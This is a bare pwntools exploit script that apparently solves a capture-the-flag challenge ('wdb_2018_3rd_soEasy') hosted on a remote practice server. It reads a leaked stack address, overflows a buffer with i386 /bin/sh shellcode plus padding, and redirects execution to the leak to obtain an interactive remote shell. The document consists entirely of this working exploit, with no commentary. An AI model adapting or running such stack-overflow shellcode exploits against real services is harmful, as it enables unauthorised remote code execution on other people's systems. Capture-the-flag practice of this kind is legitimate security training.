from pwn import *


# p = process("./wdb_2018_3rd_soEasy")
p = remote("node4.buuoj.cn", 28053)


context(os="linux", arch="i386")

p.recvuntil("Hei,give you a gift->")
info = int(p.recvuntil("\n", drop=True), 16)
print("get info: ", hex(info))

code = asm(shellcraft.sh())
pad = code.ljust(0x48+0x4)
pad += p64(info)
p.send(pad)

p.interactive()


